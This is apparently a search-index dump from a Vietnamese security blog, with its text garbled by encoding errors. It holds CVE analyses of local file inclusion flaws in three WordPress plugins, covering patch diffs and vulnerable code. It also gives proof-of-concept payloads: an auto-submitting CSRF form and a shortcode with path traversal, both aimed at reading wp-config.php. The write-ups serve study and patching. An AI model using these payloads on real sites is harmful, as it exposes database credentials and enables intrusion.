thu·∫≠t ph·ªï bi·∫øn l√† l·ª´a m·ªôt admin (ho·∫∑c ng∆∞·ªùi c√≥ quy·ªÅn) truy c·∫≠p trang web ch·ª©a payload. Khi admin m·ªü trang ƒë√≥, tr√¨nh duy·ªát s·∫Ω g·ª≠i y√™u c·∫ßu t·ªõi site WordPress k√®m cookie phi√™n ƒëang c√≤n hi·ªáu l·ª±c - do ƒë√≥ y√™u c·∫ßu ƒë∆∞·ª£c coi l√† ƒë√£ x√°c th·ª±c l√† t·ª´ admin. N·∫øu plugin nh·∫≠n v√† th·ª±c thi tham s·ªë m√† kh√¥ng ki·ªÉm tra nonce ho·∫∑c quy·ªÅn truy c·∫≠p, payload LFI s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† d·∫´n t·ªõi l·ªó h·ªïng. Chu·∫©n h√≥a v√† ki·ªÉm tra ƒë∆∞·ªùng d·∫´n b·∫±ng realpath() $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function plugin_page() { $license_envato_api = new EnvatoLicenseApiCall(); $settingsView = __DIR__ . '/views/settingsView.php'; if ( file_exists( $settingsView ) ) { include $settingsView; } } settingsView.php lu√¥n t·ªìn t·∫°i trong m√£ ngu·ªìn n√™n ch·∫Øc ch·∫Øn ƒë∆∞·ª£c include trong h√†m plugin_page() public function admin_menu() { $parent_slug = 'licenseenvato'; $capability = 'manage_options'; add_submenu_page( $parent_slug, __( 'Settings', 'licenseenvato' ), __( 'Settings', 'licenseenvato' ), $capability, $parent_slug.'-settings', [ $this, 'settings' ] ); } public function settings() { $settings = new Settings(); $settings-\u003eplugin_page(); } plugin_page() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa submenu ‚ÄúSettings‚Äù, ƒë∆∞·ª£c ƒëƒÉng k√Ω trong h√†m admin_menu(). Submenu n√†y c√≥ quy·ªÅn truy c·∫≠p manage_options, n√™n ch·ªâ hi·ªÉn th·ªã v·ªõi admin. Khi admin m·ªü trang con ‚ÄúSettings‚Äù (endpoint licenseenvato-settings), WordPress s·∫Ω g·ªçi settings(), t·ª´ ƒë√≥ kh·ªüi t·∫°o l·ªõp Settings v√† ch·∫°y plugin_page(). ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web ch·ª©a LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ew41bu1\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"licenseenvato-settings\"\u003e \u003cinput type=\"text\" name=\"tab\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web ch·ª©a LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web ch·ª©a LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 1.0.0 c·ªßa License For Envato cho ph√©p LFI v√¨ include() d√πng $atts['template'] ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c; l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong 1.1.0 b·∫±ng basename() + realpath() v√† ki·ªÉm tra base_dir. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rVi·ªác ch·ªâ d√πng sanitize_text_field() kh√¥ng ƒë·ªß ƒë·ªÉ ngƒÉn ch·∫∑n path traversal trong PHP. M·ªçi tham s·ªë ƒë∆∞·ª£c d√πng trong include() ho·∫∑c thao t√°c file ph·∫£i ƒë∆∞·ª£c ki·ªÉm so√°t b·∫±ng whitelist ho·∫∑c realpath(). CSRF k·∫øt h·ª£p LFI c√≥ th·ªÉ bi·∫øn l·ªó h·ªïng d√†nh cho admin th√†nh l·ªó h·ªïng unauthenticated, n·∫øu thi·∫øu ki·ªÉm tra nonce. C·∫ßn ki·ªÉm tra k·ªπ input v√† gi·ªõi h·∫°n ph·∫°m vi file c√≥ th·ªÉ truy c·∫≠p, ƒë·∫∑c bi·ªát trong c√°c plugin x·ª≠ l√Ω template ho·∫∑c view. Lu√¥n x√°c th·ª±c v√† r√†ng bu·ªôc ƒë∆∞·ªùng d·∫´n khi include file - kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu t·ª´ request, d√π ƒë√£ ‚Äúsanitize‚Äù. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress License For Envato Plugin \u003c= 1.0.0 is vulnerable to Local File Inclusion ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Subscribe to Download Lite phi√™n b·∫£n ‚â§ 1.2.9 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) v√† 1.3.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Trong phi√™n b·∫£n l·ªói, $form_template ƒë∆∞·ª£c concat v√†o chu·ªói v√† include nh∆∞ng kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o =\u003e nguy c∆° LFI x·∫£y ra, v√≠ d·ª•: $form_template = '../../../../../../../wp-config' B·∫£n v√°: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e B·∫£n v√° s·ª≠ d·ª•ng basename() ƒë·ªÉ l·∫•y ph·∫ßn t√™n file c·ªßa $form_template lo·∫°i b·ªè c√°c k√Ω t·ª± traversal sequence ../, v√≠ d·ª•: ../../../../../../payload.pdf -\u003e payload.pdf Sau ƒë√≥ concat v√†o $base_dir v√† l·∫•y ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi b·∫±ng realpath r·ªìi include() =\u003e tri·ªát ti√™u ho√†n to√†n kh·∫£ nƒÉng LFI. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rform-template.php ch·ª©a code c√≥ l·ªó h·ªïng ·ªü tr√™n ƒë∆∞·ª£c g·ªçi trong stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template l√† gi√° tr·ªã c·ªßa $atts['template'] Theo kinh nghi·ªám ph√¢n t√≠ch CVE tr√™n WordPress plugin c·ªßa t√¥i, $atts th∆∞·ªùng l√† c√°c attribute c·ªßa shortcode, v√≠ d·ª•: [pornhub id=69] C√≥ th·ªÉ th·∫•y r·∫±ng file form-template.php lu√¥n ƒë∆∞·ª£c include trong kh·ªëi if-else n·∫±m b√™n trong ph·∫ßn else, khi cookie stdl_encryption_key kh√¥ng t·ªìn t·∫°i (t·ª©c l√† ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng k√Ω ho·∫∑c ch∆∞a c√≥ kh√≥a m√£ h√≥a h·ª£p l·ªá). stdl-shortcode.php ƒë∆∞·ª£c include trong callback c·ªßa shortcode subscribe_to_download_form v·ªõi atts l√† m·∫£ng c√°c attribute c·ªßa shortcode. function __construct() { add_shortcode('subscribe_to_download_form', array($this, 'generate_shortcode_output')); } function generate_shortcode_output($atts) { wp_enqueue_style('stdl-frontend-custom', STDL_CSS_DIR . '/stdl-custom.css', array(), STDL_VERSION); ob_start(); include(STDL_PATH . 'inc/views/frontend/stdl-shortcode.php'); $form_html = ob_get_contents(); ob_clean(); return $form_html; } ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rƒêƒÉng nh·∫≠p v√†o WordPress b·∫±ng t√†i kho·∫£n Contributor c√≥ ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ t·∫°o post. Step 2\rT·∫°o post v·ªõi shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rƒêƒÉng nh·∫≠p v√†o WordPress b·∫±ng t√†i kho·∫£n Contributor c√≥ ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ t·∫°o post. Step 2\rT·∫°o post v·ªõi shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rƒêƒÉng nh·∫≠p v√†o WordPress b·∫±ng t√†i kho·∫£n Contributor c√≥ ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ t·∫°o post. Step 2\rT·∫°o post v·ªõi shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 1.2.9 c·ªßa Subscribe to Download Lite cho ph√©p LFI v√¨ include() d√πng $atts['template'] ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c; l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong 1.3.0 b·∫±ng basename() + realpath() v√† ki·ªÉm tra base_dir. C·∫≠p nh·∫≠t ngay. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rInput t·ª´ shortcode kh√¥ng ƒë∆∞·ª£c tin c·∫≠y ‚Äî kh√¥ng include tr·ª±c ti·∫øp. Patch (v1.3.0) d√πng basename() + realpath() + so s√°nh v·ªõi th∆∞ m·ª•c cho ph√©p. H√†nh ƒë·ªông: c·∫≠p nh·∫≠t plugin, whitelist/validate attributes. Gi√°m s√°t logs cho k√Ω t·ª± ../ trong tham s·ªë template. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress Subscribe to Download Lite Plugin \u003c= 1.2.9 is vulnerable to Local File Inclusion ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Team Manager phi√™n b·∫£n ‚â§ 2.1.23 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) v√† 2.2.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Elementor plugin ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Trong phi√™n b·∫£n l·ªói, h√†m renderElementorLayout() kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o. attacker c√≥ th·ªÉ v∆∞·ª£t qua logic tr√™n khi ki·ªÉm so√°t ƒë∆∞·ª£c $layout v√† $settings, v√≠ d·ª•: Trong h√†m renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Khi ƒë√≥: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName=wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php Debugger gi√° tr·ªã c·ªßa c√°c bi·∫øn Sau khi v∆∞·ª£t qua c√°c m·ªánh ƒë·ªÅ if th√¨ include gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../') : private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Khi ƒë√≥: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" - locate_template() s·∫Ω tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi c·ªßa file n·∫øu t√¨m th·∫•y, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ chu·ªói r·ªóng \"\". Khi $locate_template r·ªóng th√¨ tr·∫£ v·ªÅ TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' ƒë·ªÉ include. B·∫£n v√°: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { wp_die(__('TM_PATH is not defined.', 'wp-team-manager')); } // Define Free path (always available) $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/'); // Define Pro path if available $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null; // Ensure the free path is valid if (!$basePath) { wp_die(__('Invalid base template path.', 'wp-team-manager')); } $templateName = sanitize_file_name($styleType . '.php'); // Define possible template paths (Pro first, then Free) $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null; $freeFullPath = $basePath . '/' . $layout . '/' . $templateName; // Check if Pro template exists and is readable if ($proFullPath \u0026\u0026 is_readable($proFullPath) \u0026\u0026 strpos(realpath($proFullPath), $proPath) === 0) { include $proFullP","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rTh√¥ng tin\rCh·ªØ Elementor trong t√™n h√†m renderElementorLayout() li√™n quan ƒë·∫øn plugin Elementor plugin trong WordPress, d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho post. Khi g·ª≠i request ch·ªânh s·ª≠a post ch·ª©a widgets Team Manager n√†y ho·∫∑c m·ªü post sau khi l∆∞u th√¨ renderElementorLayout() s·∫Ω ƒë∆∞·ª£c g·ªçi. Plugin element trong Elementor B·∫Øt request ch·ªânh s·ª≠a b·∫±ng BurpSuite: Key settings trong request Quan s√°t ta th·∫•y c√≥ key settings ch·ª©a c√°c key layout_type v√† {layout_type_value}_stype_type t∆∞∆°ng ·ª©ng v·ªõi code ta ph√¢n t√≠ch ·ªü tr√™n: $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); üëâ Ta c√≥ th·ªÉ ki·ªÉm so√°t c√°c gi√° tr·ªã ·ªü ƒë√¢y. ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o team m·ªõi t·∫°i endpoint: wp-admin/post-new.php?post_type=team_manager v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa widget Team Manager. Step 2\rT·∫°o post b·∫±ng Elementor, th√™m widgets Team Manager. Th√™m Team Manager widget v√†o post Step 3\rSubmit, b·∫Øt request b·∫±ng BurpSuite g·ª≠i ƒë·∫øn Repeater Step 4\rB√¥i ƒëen gi√° tr·ªã c·ªßa param action,s·ª≠a payload t·∫°i tab Inspector v√† g·ª≠i l·∫°i request Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#proof-of-concept-poc"},{"categories":["CVE 